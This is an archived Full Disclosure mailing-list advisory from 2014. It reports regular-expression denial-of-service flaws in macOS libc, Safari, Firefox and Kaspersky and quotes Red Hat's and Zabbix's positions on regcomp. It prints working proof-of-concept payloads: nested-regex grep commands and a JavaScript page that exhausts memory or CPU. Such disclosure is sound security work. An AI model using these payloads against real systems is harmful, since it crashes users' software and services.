=== Content from seclists.org_699b60a0_20250125_011838.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](165)
[By Date](date.html#166)
[![Next](/images/right-icon-16x16.png)](167)

[![Previous](/images/left-icon-16x16.png)](299)
[By Thread](index.html#166)
[![Next](/images/right-icon-16x16.png)](173)

![](/shared/images/nst-icons.svg#search)

# MacOSX Safari Firefox Kaspersky RegExp Remote/Local Denial of Service

---

*From*: "[CXSEC]" <submit () cxsec org>

*Date*: Fri, 14 Mar 2014 08:43:27 +0100

---

```
MacOSX Safari Firefox Kaspersky RegExp Remote/Local Denial of Service
<http://cxsecurity.com/>

---- 0. Where is the problem? ----
Some time ago I have reported vulnerabilities in regcomp() in BSD
implementation (CVE-2011-3336) and GNU libc implementation (CVE-2010-4051
CVE-2010-4052).
Now is the time for MacOSX and other software and It seems that the problem
is still in their implementations.

--- MacOSX 10.9.2 libc PoC ---
0:kozak6 cx$ ls |grep -E
'((.*)(((((((((((((((((((((((((((((((.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}.*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+))'
grep(715,0x7fff746ed310) malloc: *** mach_vm_map(size=18446744071973109760)
failed (error code=3)
*** error: can't allocate region
*** set a breakpoint in malloc_error_break to debug
grep: out of memory
--- MacOSX 10.9.2 libc PoC ---

Recursion in Apple regcomp/libc() can lead to consumption, exhaustion, etc.
(CWE-399)
The same problem occurs in javascript regexp implementation on Safari and
Firefox.
In Kaspersky 14.0.0.4651(e) CPU Exhaustion has been observed.

Verified;
- Safari 7.0.2 (9537.74.9)
  MacOSX 10.9.2 Memory exhaustion (unpatched  CVE-2011-3336)
  Phone 4S, iOS 7.0.6 Crash

- Firefox 27.0.1
  Windows: Crash
  <http://cert.cx/regexp-smaczki/regcomp2.png>
  <http://cert.cx/regexp-smaczki/visual4.png>
  <http://cert.cx/regexp-smaczki/visual3.png>

  MacOSX: Memory exhaustion

- Kaspersky 14.0.0.4651(e)
  CPU Exhaustion and can't restart kaspersky again
  <http://cert.cx/regexp-smaczki/kaspersky.jpg>

We don't know full list of affected vendors. Anyway javascript PoC
avaliable here

<http://cert.cx/regexp-smaczki/regex.html>

--- JavaScript PoC ---
<HTML>
<HEAD>
<TITLE>Firefox 27.0.1 and Safari 7.0.2 (9537.74.9)</TITLE>
</HEAD>
<BODY BGCOLOR="#FFFFFF">
<SCRIPT type="text/javascript">
var patt1=new
RegExp("((.*)(((((((((((((((((((((((((((((((.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}(.*){10}.*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+).*)+))");
document.write(patt1.exec("peace"));
</SCRIPT>
</BODY>
</HTML>
--- JavaScript PoC ---

On Safari and Firefox under MacOSX this script will consume excessive
memory. Windows version has allocated 3,8GB and crash

----------------------------
int readChecked(unsigned negativePositionOffest)
        {
            if (pos < negativePositionOffest)
                CRASH();
            unsigned p = pos - negativePositionOffest;
            ASSERT(p < length);
            return input[p];
        }
----------------------------

Firefox don't support 64 bits version for windows and only 4gb can be
allocated to cause CRASH().

The most interesting is CPU Exhaustion observed in avp.exe process. Many
requests to website where RegEx()/javascript code is located cause
exhaustion of one cpu core. Closing and restarting Kaspersky is impossible.

The situation with regexp security is not declared. Many vendors think that
regcomp() should be secure by default but are also others opinions

<https://bugzilla.redhat.com/show_bug.cgi?id=645859>
---
Red Hat does not consider crash of client application, using regcomp()
or regexec() routines on untrusted input without preliminary checking
the input for the sanity, to be a security issue (the described deficiency
implies and is a known limitation of the glibc regular expression engine
implementation). The expressions can be modified to avoid quantification
nesting, or program modified to limit size of input passed to regular
expression engine. We do not currently plan to fix these flaws. If more
information becomes available at a future date, we may revisit these issues.
---

and try compare with ZABIX statement

<https://support.zabbix.com/browse/ZBX-4625>

---
It shouldn't be fixed in Zabbix. That's something to be addressed by glibc
maintainers.
---

In January 2014 Juniper has officially patched CVE-2010-4051 and
CVE-2010-4052 in own products.

<http://kb.juniper.net/InfoCenter/index?page=content&id=JSA10612>.

MacOSX libc in 10.9.2 is still vulnerable for CVE-2011-3336.

0:log cx$ ls |grep -E '(.?)((((.*){1,100}){1,100}){1,100}){1,100}'

It shows how many varieties of regular expression we have and how hard it
is to keep a single standard.

--- 1. Credit ---
Maksymilian Arciemowicz
<http://cxsecurity.com/>

--- 2. References ---
<http://cxsecurity.com/issue/WLB-2011010121>
<http://cxsecurity.com/issue/WLB-2011110082>
<http://cxsecurity.com/cveshow/CVE-2010-4051>
<http://cxsecurity.com/cveshow/CVE-2010-4052>
<http://www.kb.cert.org/vuls/id/912279>
<http://cxsecurity.com/cveshow/CVE-2011-3336>
<http://cxsecurity.com/>
<http://cert.cx/regexp-smaczki/regcomp2.png>
<http://cert.cx/regexp-smaczki/visual4.png>
<http://cert.cx/regexp-smaczki/visual3.png>
<http://cert.cx/regexp-smaczki/kaspersky.jpg>
<https://bugzilla.redhat.com/show_bug.cgi?id=645859>
<https://support.zabbix.com/browse/ZBX-4625>
<http://cert.cx/regexp-smaczki/regex.html>
<https://devilteam.pl/kaspkersky.html>
<https://devilteam.pl/>

Best regards,
CXSEC TEAM
<http://cxsec.org/>

```
```
_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>
```

---

[![Previous](/images/left-icon-16x16.png)](165)
[By Date](date.html#166)
[![Next](/images/right-icon-16x16.png)](167)

[![Previous](/images/left-icon-16x16.png)](299)
[By Thread](index.html#166)
[![Next](/images/right-icon-16x16.png)](173)

### Current thread:

* **MacOSX Safari Firefox Kaspersky RegExp Remote/Local Denial of Service** *[CXSEC] (Mar 14)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from cxsecurity.com_560bff3c_20250125_011839.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


